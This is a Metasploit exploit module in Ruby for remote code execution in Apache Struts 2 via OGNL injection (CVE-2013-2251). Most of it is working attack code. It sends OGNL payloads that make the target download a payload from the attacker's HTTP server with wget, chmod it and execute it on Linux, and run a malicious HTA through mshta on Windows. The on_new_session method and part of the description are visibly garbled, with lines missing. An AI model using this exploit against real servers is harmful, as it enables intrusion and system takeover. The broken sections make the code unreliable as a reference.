# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution&#039;,
      &#039;Description&#039;    => %q{
        The Struts 2 DefaultActionMapper supports a method for short-circuit navigation
        attaching navigational information to buttons within forms.

        In Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or
        "redirectAction:" is not properly sanitized. Since said information will be
        possibility to inject server side code.

        This module has been tested successfully on Struts 2.3.15 over Tomcat 7, with
        Windows 2003 SP2 and Ubuntu 10.04 operating systems.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Takeshi Terada&#039;, # Vulnerability discovery
          &#039;sinn3r&#039;,         # Metasploit module
          &#039;juan vazquez&#039;    # Metasploit modules
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-2251&#039; ],
          [ &#039;OSVDB&#039;, &#039;95405&#039; ],
          [ &#039;BID&#039;, &#039;61189&#039; ],
          [ &#039;URL&#039;, &#039;http://struts.apache.org/release/2.3.x/docs/s2-016.html&#039; ]
        ],
      &#039;Platform&#039;       => [ &#039;win&#039;, &#039;linux&#039;],
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic&#039;, {}],
          [&#039;Windows&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [&#039;Linux&#039;,
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 10
        },
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive,
      &#039;DisclosureDate&#039;  => &#039;Jul 2 2013&#039;,
      &#039;DefaultTarget&#039;   => 0))

    register_options(
    [
      Opt::RPORT(8080),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Action URI&#039;, &#039;/struts2-blank/example/HelloWorld.action&#039;]),
      OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the payload request&#039;, 60]),
      # It isn&#039;t OptPath becuase it&#039;s a *remote* path
      OptString.new("WritableDir", [ true, "A directory where we can write files (only on Linux targets)", "/tmp" ])
    ], self.class)
  end

  def on_new_session(session)
      session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
    end

    @dropped_files.delete_if do |file|
      false unless file =~ /\.exe/
      win_file = file.gsub("/", "\\\\")
        begin
          wintemp = session.fs.file.expand_path("%TEMP%")
          win_file = "#{wintemp}\\#{win_file}"
          session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
          session.fs.file.rm(win_file)
          print_good("Deleted #{file}")
          true
          print_error("Failed to delete #{win_file}")
          false
        end
      end
    end

    super
  end

  def start_http_service
    #do not use SSL
    if datastore[&#039;SSL&#039;]
      ssl_restore = true
      datastore[&#039;SSL&#039;] = false
    end

    if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
      srv_host = Rex::Socket.source_address(rhost)
    else
      srv_host = datastore[&#039;SRVHOST&#039;]
    end

    service_url = srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s
    print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
    start_service({
      &#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => &#039;/&#039;
      }
    })

    datastore[&#039;SSL&#039;] = true if ssl_restore

    return service_url
  end

  def check
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      &#039;uri&#039; => uri,
      &#039;method&#039; => &#039;GET&#039;
    })

    if res.nil? or res.code != 200
      print_error("#{rhost}:#{rport} - Check needs a valid action, returning 200, as TARGETURI")
      return Exploit::CheckCode::Unknown
    end

    proof = rand_text_alpha(6 + rand(4))

    res = send_request_cgi({
      &#039;uri&#039; => "#{uri}?redirect:%25{new%20java.lang.String(&#039;#{proof}&#039;)}",
      &#039;method&#039; => &#039;GET&#039;
    })

    if res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /#{proof}/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Unknown
  end

  def auto_target
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({
      &#039;uri&#039; => uri,
      &#039;method&#039; => &#039;GET&#039;
    })

    if res.nil? or res.code != 200
      fail_with(Exploit::Failure::NoTarget, "#{rhost}:#{rport} - In order to autodetect, a valid action, returning 200, must be provided as TARGETURI, returning 200")
    end

    proof = rand_text_alpha(6 + rand(4))

    res = send_request_cgi({
      &#039;uri&#039; => "#{uri}?redirect:%25{new%20java.io.File(&#039;.&#039;).getCanonicalPath().concat(&#039;#{proof}&#039;)}",
      &#039;method&#039; => &#039;GET&#039;
    })

    if res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /#{proof}/
      if res.headers[&#039;Location&#039;] =~ /:\\/
        return targets[1] # Windows
      else
        return targets[2] # Linux
      end
    end

    fail_with(Exploit::Failure::NoTarget, "#{rhost}:#{rport} - Target auto-detection didn&#039;t work")

  end

  def exploit_linux

    downfile = rand_text_alpha(8+rand(8))
    @pl = @exe
    @pl_sent = false

    #
    # start HTTP service if necessary
    #
    service_url = start_http_service

    #
    # download payload
    #
    fname = datastore[&#039;WritableDir&#039;]
    fname = "#{fname}/" unless fname =~ %r&#039;/$&#039;
    fname << downfile
    uri = normalize_uri(target_uri.path)
    uri << "?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#039;wget&#039;,&#039;#{service_url}&#039;,&#039;-O&#039;,new%20java.lang.String(&#039;#{fname.gsub(/\//,"$")}&#039;).replace(&#039;$&#039;,&#039;\\u002f&#039;)})).start()}"

    print_status("#{rhost}:#{rport} - Downloading payload to #{fname}...")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => uri
    })

    if res.nil? or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - OGNL injection failed")
    end

    #
    # wait for payload download
    #
    wait_payload

    register_file_for_cleanup(fname)

    #
    # chmod
    #
    uri = normalize_uri(target_uri.path)
    uri << "?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#039;chmod&#039;,&#039;777&#039;,new%20java.lang.String(&#039;#{fname.gsub(/\//,"$")}&#039;).replace(&#039;$&#039;,&#039;\\u002f&#039;)})).start()}"

    print_status("#{rhost}:#{rport} - Make payload executable...")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => uri
    })

    if res.nil? or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - OGNL injection failed")
    end

    #
    # execute
    #
    uri = normalize_uri(target_uri.path)
    uri << "?redirect:%25{(new%20java.lang.ProcessBuilder(new%20java.lang.String(&#039;#{fname.gsub(/\//,"$")}&#039;).replace(&#039;$&#039;,&#039;\\u002f&#039;))).start()}"

    print_status("#{rhost}:#{rport} - Execute payload...")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => uri
    })

    if res.nil? or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - OGNL injection failed")
    end

  end

  def exploit_windows
    @var_exename = rand_text_alpha(4 + rand(4)) + &#039;.exe&#039;
    @pl = build_hta
    @pl_sent = false

    #
    # start HTTP service if necessary
    #
    service_url = start_http_service

    #
    # execute hta
    #
    uri = normalize_uri(target_uri.path)
    uri << "?redirect:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{&#039;mshta&#039;,new%20java.lang.String(&#039;http:nn#{service_url}&#039;).replace(&#039;n&#039;,&#039;\\u002f&#039;)})).start()}"

    print_status("#{rhost}:#{rport} - Execute payload through malicious HTA...")

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => uri
    })

    if res.nil? or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - OGNL injection failed")
    end

    #
    # wait for payload download
    #
    wait_payload

    register_file_for_cleanup(@var_exename)
  end

  def exploit
    if target.name =~ /Automatic/
      print_status("#{rhost}:#{rport} - Target autodetection...")
      my_target = auto_target
      print_good("#{rhost}:#{rport} - #{my_target.name} target found!")
    else
      my_target = target
    end

    p = exploit_regenerate_payload(my_target.platform, my_target.arch)
    @exe = generate_payload_exe({:code => p.encoded, :platform => my_target.platform, :arch => my_target.arch})

    if my_target.name =~ /Linux/
      if datastore[&#039;PAYLOAD&#039;] =~ /windows/
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - The target is Linux, but you&#039;ve selected a Windows payload!")
      end
      exploit_linux
    elsif my_target.name =~ /Windows/
      if datastore[&#039;PAYLOAD&#039;] =~ /linux/
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - The target is Windows, but you&#039;ve selected a Linux payload!")
      end
      exploit_windows
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    vprint_status("#{rhost}:#{rport} - URI requested: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @pl_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the payload...")

    waited = 0
    while (not @pl_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

  def build_hta
    var_shellobj    = rand_text_alpha(rand(5)+5);
    var_fsobj        = rand_text_alpha(rand(5)+5);
    var_fsobj_file    = rand_text_alpha(rand(5)+5);
    var_vbsname        = rand_text_alpha(rand(5)+5);
    var_writedir    = rand_text_alpha(rand(5)+5);

    var_origLoc        = rand_text_alpha(rand(5)+5);
    var_byteArray    = rand_text_alpha(rand(5)+5);
    var_writestream    = rand_text_alpha(rand(5)+5);
    var_strmConv    = rand_text_alpha(rand(5)+5);

    # Doing in this way to bypass the ADODB.Stream restrictions on JS,
    # even when executing it as an "HTA" application
    # The encoding code has been stolen from ie_unsafe_scripting.rb
    print_status("#{rhost}:#{rport} - Encoding payload into vbs/javascript/hta...");

    # Build the content that will end up in the .vbs file
    vbs_content  = Rex::Text.to_hex(%Q|
Dim #{var_origLoc}, s, #{var_byteArray}
#{var_origLoc} = SetLocale(1033)
|)
    # Drop the exe payload into an ansi string (ansi ensured via SetLocale above)
    # for conversion with ADODB.Stream
    vbs_ary = []
    # The output of this loop needs to be as small as possible since it
    # gets repeated for every byte of the executable, ballooning it by a
    # factor of about 80k (the current size of the exe template).  In its
    # current form, it&#039;s down to about 4MB on the wire
    @exe.each_byte do |b|
      vbs_ary << Rex::Text.to_hex("s=s&Chr(#{("%d" % b)})\n")
    end
    vbs_content << vbs_ary.join("")

    # Continue with the rest of the vbs file;
    # Use ADODB.Stream to convert from an ansi string to it&#039;s byteArray equivalent
    # Then use ADODB.Stream again to write the binary to file.
    #print_status("Finishing vbs...");
    vbs_content << Rex::Text.to_hex(%Q|
Dim #{var_strmConv}, #{var_writedir}, #{var_writestream}
#{var_writedir} = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\\#{@var_exename}"

Set #{var_strmConv} = CreateObject("ADODB.Stream")

#{var_strmConv}.Type = 2
#{var_strmConv}.Charset = "x-ansi"
#{var_strmConv}.Open
#{var_strmConv}.WriteText s, 0
#{var_strmConv}.Position = 0
#{var_strmConv}.Type = 1
#{var_strmConv}.SaveToFile #{var_writedir}, 2

SetLocale(#{var_origLoc})|)

    hta = <<-EOS
      <script>
      var #{var_shellobj} = new ActiveXObject("WScript.Shell");
      var #{var_fsobj}    = new ActiveXObject("Scripting.FileSystemObject");
      var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings("%TEMP%");
      var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs",2,true);

      #{var_fsobj_file}.Write(unescape("#{vbs_content}"));
      #{var_fsobj_file}.Close();

      #{var_shellobj}.run("wscript.exe " + #{var_writedir} + "\\\\" + "#{var_vbsname}.vbs", 1, true);
      #{var_shellobj}.run(#{var_writedir} + "\\\\" + "#{@var_exename}", 0, false);
      #{var_fsobj}.DeleteFile(#{var_writedir} + "\\\\" + "#{var_vbsname}.vbs");
      window.close();
      </script>
    EOS

    return hta
  end


end

